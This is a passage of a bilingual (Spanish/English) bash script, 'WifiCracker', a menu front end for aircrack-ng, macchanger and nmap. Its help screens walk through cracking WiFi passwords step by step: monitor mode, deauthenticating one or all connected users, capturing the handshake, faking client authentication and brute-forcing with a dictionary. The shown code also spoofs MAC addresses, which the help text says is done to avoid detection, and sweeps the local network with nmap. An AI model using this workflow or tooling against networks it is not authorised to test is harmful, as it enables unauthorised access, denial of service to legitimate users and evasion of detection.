        Yes | yes | Y | y ) echo " "
             echo -e "$greenColour Starting the installation...$endColour"
             echo " "
             sleep 2
             sudo apt-get install aircrack-ng
             echo " "
             echo -e "$blueColour Installation Finished!$endColour"
             echo " "
             echo -e "$redColour Press <Enter> to continue$endColour"
             read
             ;;

        No | n | no | No ) echo " "
             echo -e "$redColour Canceled 'aircrack-ng' installation...$endColour"
             echo " "
             sleep 3
             ;;
      esac
    fi

    if [ "$macchg" = "1" ]; then
      echo " "
      echo -e "$greenColour 'macchanger' will be installed on your computer, do you want to continue?$endColour $blueColour(Yes/No)$endColour"
      echo -n -e "$yellowColour-> $endColour"
      read respuestaB

      case $respuestaB in

        Yes | yes | Y | y ) echo " "
             echo -e "$greenColour Starting the installation...$endColour"
             echo " "
             sleep 2
             sudo apt-get install macchanger
             echo " "
             echo -e "$blueColour Installation Finished!$endColour"
             echo " "
             echo -e "$redColour Press <Enter> to continue$endColour"
             read
             ;;

        No | n | no | No ) echo " "
             echo -e "$redColour Canceled 'macchanger' installation...$endColour"
             echo " "
             sleep 3
             ;;
      esac
    fi

    if [ "$xdt" = "1" ]; then

      echo " "
      echo -e "$greenColour 'xdotool' will be installed on your computer, do you want to continue?$endColour $blueColour(Yes/No)$endColour"
      echo -n -e "$yellowColour-> $endColour"
      read respuestaC

      case $respuestaC in

        Yes | yes | Y | y ) echo " "
             echo -e "$greenColour Starting the installation...$endColour"
             echo " "
             sleep 2
             sudo apt-get install xdotool
             echo " "
             echo -e "$blueColour Installation Finished!$endColour"
             echo " "
             echo -e "$redColour Press <Enter> to continue$endColour"
             read
             ;;

        No | n | no | No) echo " "
             echo -e "$redColour Canceled 'xdotool' installation...$endColour"
             echo " "
             sleep 3
             ;;
      esac
    fi

    if [ "$nm" = "1" ]; then
      echo " "
      echo -e "$greenColour 'Nmap' will be installed on your computer, do you want to continue?$endColour $blueColour(Yes/No)$endColour"
      echo -n -e "$yellowColour-> $endColour"
      read respuestaD

      case $respuestaD in

      Yes | yes | Y | y ) echo " "
             echo -e "$greenColour Starting the installation...$endColour"
             echo " "
             sleep 2
             sudo apt-get install nmap
             echo " "
             echo -e "$blueColour Installation Finished!$endColour"
             echo " "
             echo -e "$redColour Press <Enter> to continue$endColour"
             read
             ;;

        No | n | no | No ) echo " "
             echo -e "$redColour Canceled 'Nmap' installation...$endColour"
             echo " "
             sleep 3
             ;;
      esac
    fi
  fi


}

autorInfo(){

  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -e "$grayColour Programa hecho por Marcelo Raúl Vázquez Pereyra || Copyright 2016 © Marcelo Raúl Vázquez Pereyra$endColour"
    echo " "
    echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -e "$grayColour Program made by Marcelo Raúl Vázquez Pereyra || Copyright 2016 © Marcelo Raúl Vázquez Pereyra$endColour"
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu $endColour"
    read
  fi

}

versionSystem(){

  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -e "$grayColour WifiCracker (v0.1.8) - Copyright 2016 © Marcelo Raúl Vázquez Pereyra$endColour"
    echo " "
    echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -e "$grayColour WifiCracker (v0.1.8) - Copyright 2016 © Marcelo Raúl Vázquez Pereyra$endColour"
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu $endColour"
    read
  fi

}

panelHelp(){

  if [ "$spanOptions" = "1" ]; then
    clear
    echo " "
    echo -e "$greenColour*******************************************************************************************$endColour"
    echo -e "$yellowColour  El primer paso es iniciar el modo monitor a través de la opción 1. Una vez iniciado
  el modo monitor... eres capaz de escuchar y capturar cualquier paquete que viaje por el aire.

  Puedes comprobar a través de la opción 2 si has iniciado correctamente la interfaz monitor.
  Posteriormente, analizarás redes WiFis disponibles en tu entorno mediante la opción 4. Te
  saldrán tanto clientes autenticados a una red como no asociados a ninguna. Cada cliente
  está situado en 'STATION' y poseen una dirección MAC. Estos verás que están conectados a
  una dirección MAC, correspondiente a la del routter (BSSID). Puedes ver de qué WiFi se trata
  viendo su 'ESSID' correspondiente.

  El programa te permitirá filtrar la red WiFi que deseas aislando el resto pasándole como
  parámetro el nombre de la misma. Si salen varias veces la misma red, se tratan de
  repartidores de señal. Una vez hecho esto una nueva carpeta será creada en el Escritorio
  con el nombre que desees, esta contendrá varios ficheros... entre los cuales viajará
  información encriptada, incluida la contraseña del routter. El que nos interesa es el de
  extensión '.cap'.

  Una vez creadas las carpetas y ficheros, procedes a de-autenticar a los usuarios de la red.
  En este caso te centrarás en un único usuario conectado a la red, para ello lo que harás
  será escoger la dirección MAC del mismo y pasársela como parámetro cuando te sea pedida.
  También se te permite la posibildad de realizar una de-autenticación global, de forma que
  echarías a todos los usuarios de la red exceptuándote a ti mismo en caso de que estés
  conectado a la misma, esto lo haces pasándole como dirección MAC -> FF:FF:FF:FF:FF:FF

  Una vez comience el 'ataque' y el usuario sea echado de la red, tendrás que parar el proceso
  de de-autenticación y esperar a que se reconecte. Cuando se reconecta se genera lo que se
  conoce como un 'Handshake', y es cuando capturamos la contraseña.

  Por tanto, una vez hecho todo este proceso, mediante la opción 7 especificamos 2 rutas,
  por un lado la del Diccionario (que deberá ser puesto en el Escritorio) y por otro la del
  fichero '.cap' que se nos generó en la opción 4. El programa comenzará a trabajar hasta
  averiguar la contraseña, la cual será mostrada en formato legible.$endColour

 $blueColour Si te surgen dudas con alguna de las opciones, puedes usar '-h' acompañada de la opción
  para ver qué función principal tiene la misma.

  Ejemplo -> '-h1, -h3, -h5...'$endColour

$greenColour**********************************************************************************************$endColour"
    echo " "
    echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    clear
    echo " "
    echo -e "$greenColour*******************************************************************************************$endColour"
    echo -e "$yellowColour  The first step is to start the monitor mode through option 1. Once the monitor mode is started...
  you are able to listen and capture any package that travels through the air.

  You can check via option 2 if you have successfully started the monitor interface.
  Later on, you will analyze WiFis networks available in your environment using option 4. You will get both authenticated
  clients to a network and not associated with any. Each client is located in 'STATION' and they have a MAC address. These will
  show that they are connected to a MAC address, corresponding to that of the routter (BSSID). You can see to which WiFi
  corresponds by looking at their corresponding 'ESSID'.

  The program will allow you to filter the WiFi network you want, isolating the rest by passing the parameter name. If the
  same network comes out several times, that's because there are signal distributors. Once this is done a new folder will be
  created in the Desktop with the name you want, it will contain several files ... among which will travel encrypted
  information, including the password of the routter. The one that interests us is the extension '.cap'.

  Once the folders and files are created, you proceed to de-authenticate the users of the network.
  In this case you will focus on a single user connected to the network, so you will choose the MAC address of the same and pass
  it as a parameter when you are asked.
  You are also allowed to the possibility of performing a global de-authentication, so you will de-authenticate all users from
  network except yourself in case you are connected to it, you do this by passing the following MAC adress -> FF: FF: FF: FF: FF: FF

  Once the 'attack' begins and the user is dropped from the network, you will have to stop the de-authentication process and wait
  for him to reconnect. When reconnected, what is known as a 'handshake' is generated, and that is when we capture the password.

  Therefore, once this process is done, by means of option 7 we specify 2 routes, on the one hand the Dictionary (which should be
  placed on the Desktop) and on the other the one the file '.cap' that was generated in the option 4.
  The program will start working until you find out the password, which will be displayed in a readable format.$endColour

 $blueColour If you have doubts about any of the options, you can use '-h' accompanied by the option to see which main function has the same.

  Example -> '-h1, -h3, -h5...'$endColour

$greenColour**********************************************************************************************$endColour"
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu $endColour"
    read
  fi
}

showIP(){

  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -n -e "$greenColour Tu IP pública es ->$endColour"
    GET http://www.vermiip.es/ | grep "Tu IP p&uacute;blica es" | cut -d ':' -f2 | cut -d '<' -f1
    echo " "
    echo -n -e "$greenColour Tu IP privada es -> $endColour"
    hostname -I
    echo " "
    echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -n -e "$greenColour Your public IP adress is ->$endColour"
    GET http://www.vermiip.es/ | grep "Tu IP p&uacute;blica es" | cut -d ':' -f2 | cut -d '<' -f1
    echo " "
    echo -n -e "$greenColour Your private IP adress is -> $endColour"
    hostname -I
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu $endColour"
    read
  fi

}

showMAC(){

  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -e "$redColour Para mostrar tu nueva dirección MAC desde la interfaz monitor es necesario que previamente lo
 hayas dado de alta a través de la opción 1. De lo contrario, obtendrás errores.$endColour"
    echo " "
    sleep 3
    echo -e "$greenColour Se va a mostrar tu nueva dirección MAC...$endColour"
    echo " "
    sleep 2
    macchanger -s mon0 | grep Current
    echo " "
    echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -e "$redColour To display your new MAC address from the monitor interface, you must have previously registered
 with option 1. Otherwise, you will get errors.$endColour"
    echo " "
    sleep 3
    echo -e "$greenColour Your new MAC address will be displayed...$endColour"
    echo " "
    sleep 2
    macchanger -s mon0 | grep Current
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu $endColour"
    read
  fi
}

changeMAC(){

  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -e "$redColour Esta opción deberías ejecutarla en caso de haber ya iniciado el modo monitor a través de la opción 1.

 De lo contrario, obtendrás errores.$endColour"
    echo " "
    sleep 3
    echo -e "$greenColour Procedemos a cambiar nuevamente tu dirección MAC en la interfaz 'mon0'...$endColour"
    echo " "
    sleep 2
    ifconfig mon0 down
    echo " "
    macchanger -a mon0
    echo " "
    ifconfig mon0 up
    echo " "
    echo -e "$blueColour ¡Proceso Terminado!, puedes comprobar tu nueva dirección MAC a través de la opción 8$endColour"
    echo " "
    echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -e "$redColour This option should be executed if you have already started the monitor mode through option 1.

 Otherwise, you will get errors.$endColour"
    echo " "
    sleep 3
    echo -e "$greenColour We proceed to change your MAC address again in the interface 'mon0'...$endColour"
    echo " "
    sleep 2
    ifconfig mon0 down
    echo " "
    macchanger -a mon0
    echo " "
    ifconfig mon0 up
    echo " "
    echo -e "$blueColour Process Completed!, you can check your new MAC address through the option 8$endColour"
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu $endColour"
    read
  fi
}

monitorHelp(){

  if [ "$spanOptions" = "1" ]; then
    clear
    echo -e "$blueColour Opción 1$endColour "
    echo " "
    echo -e "$yellowColour  Esta opción te permite estar en modo monitor. La pregunta es por qué es tan necesario hacer
  esto y qué finalidad tiene este mismo proceso.

  Cuando tú estás en modo monitor, eres capaz de escuchar y capturar cualquier tipo de paquete que viaje por el aire.
  Es importante, puesto que debemos ser capaces de capturar las direcciones MAC de los clientes cercanos que tengamos
  conectados a una red, para posteriormente de-autenticarlos (echarlos de la red) y esperar a que se reconecten
  para capturar un Handshake. Por tanto esta opción es fundamental para iniciar todo el proceso que viene a continuación,
  de lo contrario todas las opciones que usemos darán error.

  Debe ser la primera opción que escojamos.$endColour"
    echo " "
    echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    clear
    echo -e "$blueColour Opción 1$endColour "
    echo " "
    echo -e "$yellowColour  This option allows you to be in monitor mode. The question is why it is so necessary to do
  this and what purpose this process has.

  When you are in monitor mode, you are able to listen and capture any type of package that travels through the air.
  It is important, since we must be able to capture the MAC addresses of the nearby clients that we have connected to a
  network, and then de-authenticate them (throw them out of the network) and wait for them to reconnect to capture a
  Handshake.

  So this option is essential to start the whole process that follows, otherwise all the options we use will fail.$endColour"
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu $endColour"
    read
  fi

}

interfacesHelp(){

  if [ "$spanOptions" = "1" ]; then
    clear
    echo -e "$blueColour Opción 2$endColour"
    echo " "
    echo -e "$yellowColour  Esta opción te muestra las interfaces que posees. Servirá para verificar en todo momento qué está
  sucediendo con la interfaz que estamos trabajando, ya que en esta se realizarán algunos cambios. Generalmente en un principio
  deberías tener 3 interfaces, a no ser que estés bajo una VPN... que tendrás una virtual de red más. La situada en la parte inferior
  es la tarjeta de red, tarjeta de la cual nos aprovecharemos para una vez estando en modo monitor... poder capturar las redes
  disponibles en nuestros alrededores.

  Podremos comprobar si estamos en modo monitor siempre que veamos una nueva interfaz llamada 'mon0'. En caso contrario, podrá
  resultar que la tenemos dada de baja o bien no la hemos creado, por tanto tendremos que acudir a la opción 1 para crearla.$endColour"
    echo " "
    echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    clear
    echo -e "$blueColour Option 2$endColour"
    echo " "
    echo -e "$yellowColour  This option shows you the interfaces you have. It will be used to verify at all times what is
  happening with the interface that we are working on, as in this will be some changes. Generally at first you should have
  3 interfaces, unless you are under a VPN ... you will have a virtual network more. The one located at the bottom is the
  network card, card which we will take advantage of once being in monitor mode... able to capture the networks available
  in our surroundings.

  We can check if we are in monitor mode whenever we see a new interface called 'mon0'. Otherwise, it may be that it's
  uncharged or we have not created it, so we will have to go to option 1 to create it.$endColour"
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu $endColour"
    read
  fi

}

monitorDownHelp(){

  if [ "$spanOptions" = "1" ]; then
    clear
    echo -e "$blueColour Opción 3$endColour"
    echo " "
    echo -e "$yellowColour  Una vez hayamos conseguido nuestros objetivos, lo mejor es eliminar el modo monitor... pues de lo contrario
  lo tendremos inútilmente activado sin ser utilizado desde que salgamos del programa. Eliminarlo es distinto a darlo de baja, un monitor
  se da de baja para realizar configuraciones sobe él y posteriormente darlo de alta, porque de lo contrario cualquier tipo de cambio
  realizado estando en modo normal no nos será autorizado aún así siendo superusuario.

  En resúmen, con esta opción lo eliminamos completamente. Si queremos volver a darlo de alta, tendremos que usar la opción 1 nuevamente
  para crear un nuevo modo monitor.$endColour"
    echo " "
    echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    clear
    echo -e "$blueColour Option 3$endColour"
    echo " "
    echo -e "$yellowColour  Once we have achieved our goals, it's best to eliminate the monitor mode... otherwise we will have uselessly
  activated without being used since we leave the program. Deleting it is different from discharging it, a monitor is discharged to
  make configurations on it and later release it, because otherwise any change made while in normal mode will not be authorized still being
  superuser.

  In summary, with this option we eliminate it completely. If we want to re-register it, we will have to use option 1 again to create a new
  monitor mode."
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu $endColour"
    read
  fi
}

wifiScannerHelp(){

  if [ "$spanOptions" = "1" ]; then
    clear
    echo -e "$blueColour Opción 4$endColour"
    echo " "
    echo -e "$yellowColour  Simple escaneo de redes Wifi disponibles en nuestro entorno. Importante tener en cuenta que si no estamos en modo
  monitor, no seremos capaces de capturar nada."
    echo " "
    echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    clear
    echo -e "$blueColour Option 4$endColour"
    echo " "
    echo -e "$yellowColour  Simple scanning of Wifi networks available in our environment. Important to note that if we are not in monitor
  mode, we will not be able to capture anything."
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu $endColour"
    read
  fi

}

macAttackHelp(){

  if [ "$spanOptions" = "1" ]; then
    clear
    echo -e "$blueColour Opción 5$endColour"
    echo " "
    echo -e "$yellowColour  En esta opción enviarás paquetes de de-autenticación a un cliente determinado conectado a la red que tienes fijada
  como objetivo. Mediante esta opción, eres capaz de echar a un usuario cualquiera de la red especificando su dirección MAC. También puedes
  echarlos a todos usando como dirección MAC a atacar la siguiente -> FF:FF:FF:FF:FF:FF | que corresponde a un Broadcast (Todos los usuarios
  conectados a la red).

  Esta opción es sumamente importante, pues después una vez se reconecte el usuario a la red, se generará el Handhsake... cosa de la que nos
  aprovecharemos para capturar la contraseña del Wifi.
  El 'ataque' de de-autenticación terminará hasta que nosotros queramos. Es decir, el usuario no podrá volverse a conectar a la red hasta que
  nosotros paremos el envío de paquetes"
    echo " "
    echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    clear
    echo -e "$blueColour Option 5$endColour"
    echo " "
    echo -e "$yellowColour  In this option you will send de-authentication packages to a certain client connected to the target network.
  With this option, you are able to drop any user on the network by specifying their MAC address. You can eject them all using the following
  MAC address to attack -> FF: FF: FF: FF: FF: FF | Which corresponds to a Broadcast (All users connected to the network).

  This option is extremely important, since once the user is reconnected to the network, the Handhsake will be generated ... something that
  we will use to capture the Wifi password.
  The de-authentication 'attack' will end until we want to. That is, the user will not be able to reconnect to the network until we stop shipping
  packages "
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu $endColour"
    read
  fi

}

fakeAuthHelp(){


  if [ "$spanOptions" = "1" ]; then
    clear
    echo -e "$blueColour Opción 6$endColour"
    echo " "
    echo -e "$yellowColour  En ocasiones, ningún usuario estará conectado a la red... por lo que si queremos averiguar la contraseña del Wifi, nos
  será imposible. Pero no imposible del todo, por ello nos encargamos de engañar al routter haciéndole creer que hay un usuario conectado. De esta
  manera podremos realizar el procedimiento como si se tratara de un usuario normal y corriente, después de haberlo creado.

  Generalmente, lo mejor es utilizar a un usuario cualquiera que el programa nos detecte al escanear las redes, el cual no esté asociado a ninguna
  red. Lo utilizamos para asociarlo a la que queremos falsamente.
  También podemos usar nuestra propia dirección MAC (la falsa) para evitar tener que autenticar a otros. Podremos ver en todo momento qué dirección
  MAC tenemos en el monitor que hemos creado a través de la opción 8."
    echo " "
    echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    clear
    echo -e "$blueColour Option 6$endColour"
    echo " "
    echo -e "$yellowColour  Sometimes, no users will be connected to the network ... so if we want to find out the Wifi's password,
  it will be impossible. But not impossible at all, so we take care of fooling the routter by making him believe that a user is connected. From this
  way we can perform the procedure as if it were a normal user, after having created it.

  Generally, it's best to use any user that the program detects when scanning the networks, which is not associated with any network. We use it to
  associate it with what we falsely want.
  We can also use our own (false) MAC address to avoid having to authenticate others. We can see at all times which direction MAC we have in the
  monitor that we created through option 8."
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu $endColour"
    read
  fi

}

wifiPasswordHelp(){

  if [ "$spanOptions" = "1" ]; then
    clear
    echo -e "$blueColour Opción 7$endColour"
    echo " "
    echo -e "$yellowColour  A través de esta opción comienza el ataque por fuerza bruta a la contraseña del Wifi que queremos averiguar. Para ello
  tendremos que hacer uso de un Diccionario. A más grande sea el diccionario que poseas, mayor probabilidad hay de que encuentres la contraseña.
  Trabajamos con grandes datos, en ocasiones con diccionarios de 227 millones de palabras, por lo que dependiendo de la CPU de tu ordenador,
  será capaz de analizar más o menos palabras por segundo. Lo mejor ante estos casos es hacer uso de un supercomputador para obtener en cuestión
  de segundos la contraseña."
    echo " "
    echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    clear
    echo -e "$blueColour Option 7$endColour"
    echo " "
    echo -e "$yellowColour  Through this option the brute force attack with the wifi's password we want to find out begins. For that
  we will have to make use of a Dictionary. The larger the dictionary you own, the more likely you are to find the password.
  We work with big data, sometimes with dictionaries of 227 million words, so... depending of your CPU computer, you will be able
  to analyze more or less words per second. The best thing in these cases is to make use of a supercomputer to obtain passwords in
  seconds."
    echo " "
    echo -e "$redColour Press <Enter> to return to main menu $endColour"
    read
  fi

}

showMacHelp(){

  if [ "$spanOptions" = "1" ]; then
    clear
    echo -e "$blueColour Opción 8$endColour"
    echo " "
    echo -e "$yellowColour  Esta opción nos permitirá ver cuál es nuestra dirección MAC. Obviamente, la dirección mostrada es la falsa creada
  una vez hemos iniciado el modo monitor. A través de la opción 9 podremos cambiarla continuamente siempre que queramos sin ningún tipo
  de problema$endColour"
    echo " "
    echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    clear
    echo -e "$blueColour Option 8$endColour"
    echo " "
    echo -e "$yellowColour  This option will allow us to see our MAC adress. Obviously, the direction shown is fake... created
  once we have started the monitor mode. Through option 9 we can change it continuously whenever we want without any type
  of problem$endColour"
    echo " "
    echo -e "$redColour Press <Enter> to return to the main menu$endColour"
    read
  fi

}

changeMacHelp(){

  if [ "$spanOptions" = "1" ]; then
    clear
    echo -e "$blueColour Opción 9$endColour"
    echo " "
    echo -e "$yellowColour  Esta opción nos otorga cambiar nuestra dirección MAC en el modo monitor previamente creado desde la opción 1.
  Todas las direcciones MAC creadas desde esta opción del menú son falsas, hacemos estos cambios para evitar ser detectados en caso de
  haber algún tipo de problema$endColour"
    echo " "
    echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    clear
    echo -e "$blueColour Option 9$endColour"
    echo " "
    echo -e "$yellowColour  This option allows us to change our MAC address in the monitor mode previously created from option 1.
  All MAC addresses created from this menu option are fake. We make these changes to avoid being detected in case of having any
  type of problem$endColour"
    echo " "
    echo -e "$redColour Press <Enter> to return to the main menu$endColour"
    read
  fi

}

repairNetworkHelp(){

  if [ "$spanOptions" = "1" ]; then
    clear
    echo -e "$blueColour Opción 11$endColour"
    echo " "
    echo -e "$yellowColour  En ocasiones, el programa tal vez te deshabilite el icono de las redes Wifis situado en la esquina superior derecha
  de tu pantalla. Esto podrás arreglarlo fácilmente a través de esta opción.$endColour"
    echo " "
    echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    clear
    echo -e "$blueColour Option 11$endColour"
    echo " "
    echo -e "$yellowColour  Sometimes the program may disable the Wifi's Networks icon in the upper right corner
  of your screen. You can easily fix it through this option.$endColour"
    echo " "
    echo -e "$redColour Press <Enter> to return to the main menu$endColour"
    read
  fi

}

repairNetwork(){

  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -e "$greenColour Volviendo a dejar operativo el escaneo de redes de tu ordenador...$endColour"
    echo " "
    sleep 3
    service network-manager restart
    echo -e "$blueColour ¡Terminado!$endColour"
    echo " "
    sleep 3
  fi

  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -e "$greenColour Re-establishing the network scanner of your computer...$endColour"
    echo " "
    sleep 3
    service network-manager restart
    echo -e "$blueColour ¡Finished!$endColour"
    echo " "
    sleep 3
  fi

}

showProject(){

  if [ "$spanOptions" = "1" ]; then
    if [ "$(id -u)" != "0" ]; then
      echo " "
      echo -e "$blueColour Abriendo navegador...$endColour"
      echo " "
      sleep 3
      chromium-browser https://github.com/Marcelorvp/WifiCracker
      sleep 3
    else
      echo " "
      echo -e "$redColour Esta opción debe ser ejecutada como usuario normal$endColour"
      echo " "
      sleep 4
    fi
  fi

  if [ "$engOptions" = "1" ]; then
    if [ "$(id -u)" != "0" ]; then
      echo " "
      echo -e "$blueColour Opening Browser...$endColour"
      echo " "
      sleep 3
      chromium-browser https://github.com/Marcelorvp/WifiCracker
      sleep 3
    else
      echo " "
      echo -e "$redColour This option must be executed as normal user$endColour"
      echo " "
      sleep 4
    fi
  fi

}

openTerminal(){

  if [ "$spanOptions" = "1" ]; then
    echo " "
    echo -e "$greenColour Se va a abrir una nueva terminal...$endColour"
    echo " "
    sleep 3
    xdotool key ctrl+alt+t
  fi

  if [ "$engOptions" = "1" ]; then
    echo " "
    echo -e "$greenColour A new terminal will be opened...$endColour"
    echo " "
    sleep 3
    xdotool key ctrl+alt+t
  fi

}

connectedDevices(){

  if [ "$spanOptions" = "1" ]; then
    if [ "$(id -u)" = "0" ]; then
      echo " "
      echo -e "$greenColour Se van a listar los dispositivos conectados a la red$endColour"
      echo " "
      sleep 4
      nmap -sP $var1.$var2.$var3.1-254
      echo " "
      echo -e "$redColour Presione <Enter> para volver al menú principal$endColour"
      read
    else
      echo " "
      echo -e "$redColour Debes ser superusuario$endColour"
      echo " "
      exit 1
    fi
  fi

  if [ "$engOptions" = "1" ]; then
    if [ "$(id -u)" = "0" ]; then
      echo " "
      echo -e "$greenColour Devices connected to the network will be listed$endColour"
      echo " "
      sleep 4
      nmap -sP $var1.$var2.$var3.1-254
      echo " "
      echo -e "$redColour Press <Enter> to return to the main menu$endColour"
      read
    else
      echo " "
      echo -e "$redColour You must be superuser$endColour"
      echo " "
      exit 1
    fi
  fi

}

connectedDev(){

  if [ "$spanOptions" = "1" ]; then
    clear
    echo -e "$blueColour Opción 12$endColour"
    echo " "
    echo -e "$yellowColour  A través de esta opción, realizarás un escaneo haciendo uso de la herramienta 'nmap' para ver
  los dispositivos conectados en la red en la que previamente debes estar conectado.$endColour"
    echo " "
    echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
    read
  fi

  if [ "$engOptions" = "1" ]; then
    clear
    echo -e "$blueColour Option 12$endColour"
    echo " "
    echo -e "$yellowColour  Through this option, you will perform a scan using the 'nmap' tool to list
  the devices connected to the network in which you must first be connected.$endColour"
    echo " "
    echo -e "$redColour Press <Enter> to return to the main menu$endColour"
    read
  fi

}

clear
echo " "
echo -n -e "$blueColour Seleccione un idioma ($greenColour English$endColour /$redColour Español$endColour ): $endColour"
read language
if [ "$language" = "Español" ]; then
  spanOptions=1
  engOptions=0

  while true
    do
      if [ "$entrada" = "1" ]; then
        clear
        echo " "
        sleep 0.4
        echo -e "$greenColour*****************************************************************************$endColour"
        sleep 0.5
        echo -e "$redColour                        ╔╗╔╗╔╗─╔═╗╔═══╗───────╔╗$endColour                            $greenColour*$endColour"
        sleep 0.1
        echo -e "$redColour                        ║║║║║║─║╔╝║╔═╗║───────║║$endColour                            $greenColour*$endColour"
        sleep 0.1
        echo -e "$redColour                        ║║║║║╠╦╝╚╦╣║─╚╬═╦══╦══╣║╔╦══╦═╗$endColour                     $greenColour*$endColour"
        sleep 0.1
        echo -e "$redColour                        ║╚╝╚╝╠╬╗╔╬╣║─╔╣╔╣╔╗║╔═╣╚╝╣║═╣╔╝$endColour  $blueColour(v0.1.8)$endColour           $greenColour*$endColour"
        sleep 0.1
        echo -e "$redColour                        ╚╗╔╗╔╣║║║║║╚═╝║║║╔╗║╚═╣╔╗╣║═╣║ $endColour                     $greenColour*$endColour"
        sleep 0.1
        echo -e "$redColour                        ─╚╝╚╝╚╝╚╝╚╩═══╩╝╚╝╚╩══╩╝╚╩══╩╝ $endColour                     $greenColour*$endColour"
        sleep 0.
        echo -e "$greenColour*****************************************************************************$endColour"
        sleep 0.5
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$blueColour  1$endColour.$yellowColour Iniciar el modo monitor$endColour         $blueColour||$endColour $blueColour 11$endColour.$yellowColour Reparar conexión de red      $endColour  $greenColour*$endColour"
        sleep 0.1
        echo -e "$blueColour  2$endColour.$yellowColour Mostrar interfaces$endColour              $blueColour||$endColour $blueColour 12$endColour.$yellowColour Dispositivos conectados      $endColour  $greenColour*$endColour"
        sleep 0.1
        echo -e "$blueColour  3$endColour.$yellowColour Dar de baja el modo monitor$endColour     $blueColour||$endColour $blueColour 13$endColour.$yellowColour Ver Proyecto                 $endColour  $greenColour*$endColour"
        sleep 0.1
        echo -e "$blueColour  4$endColour.$yellowColour Escanear redes wifis$endColour            $blueColour||$endColour $blueColour 14$endColour.$yellowColour Abrir nueva terminal         $endColour  $greenColour*$endColour"
        sleep 0.1
        echo -e "$blueColour  5$endColour.$yellowColour Deautenticación a dirección MAC$endColour $blueColour||$endColour $blueColour 15$endColour.$yellowColour Reiniciar programa           $endColour  $greenColour*$endColour"
        sleep 0.1
        echo -e "$blueColour  6$endColour.$yellowColour Falsa autenticación de cliente$endColour  $blueColour||$endColour                                     $greenColour*$endColour "
        sleep 0.1
        echo -e "$blueColour  7$endColour.$yellowColour Obtener contraseña Wifi$endColour         $blueColour||$endColour                                     $greenColour*$endColour "
        sleep 0.1
        echo -e "$blueColour  8$endColour.$yellowColour Mostrar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
        sleep 0.1
        echo -e "$blueColour  9$endColour.$yellowColour Cambiar dirección MAC (mon0)$endColour    $blueColour||$endColour                                     $greenColour*$endColour "
        sleep 0.1
        echo -e "$blueColour 10$endColour.$yellowColour Instalar programas necesarios$endColour  $blueColour ||$endColour                                     $greenColour*$endColour "
        sleep 0.1
        echo -e "                                                                            $greenColour*$endColour "
        echo -e "$greenColour*****************************************************************************$endColour"
        sleep 0.1
        echo -e "$purpleColour---------------------------------------------------$endColour"
        sleep 0.1
        echo -e "$grayColour [[-h | --help ] [-a | --author] [-v | --version]]$endColour$purpleColour|$endColour"
        sleep 0.1
        echo -e "$purpleColour---------------------------------------------------$endColour"
        sleep 0.1
        echo -e "$redColour 0. Salir$endColour $blueColour||$endColour $grayColour? - Mostrar IP$endColour $purpleColour|$endColour"
        echo -e "$purpleColour----------------------------$endColour"
        sleep 0.5
        echo " "
        entrada=2
      fi

      if [ "$entrada" = "2" ]; then
        clear
        echo " "
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "                                                                            $greenColour*$endColour"
        echo -e "$greenColour*****************************************************************************$endColour"
        echo -e "                                                                            $greenColour*$endColour "
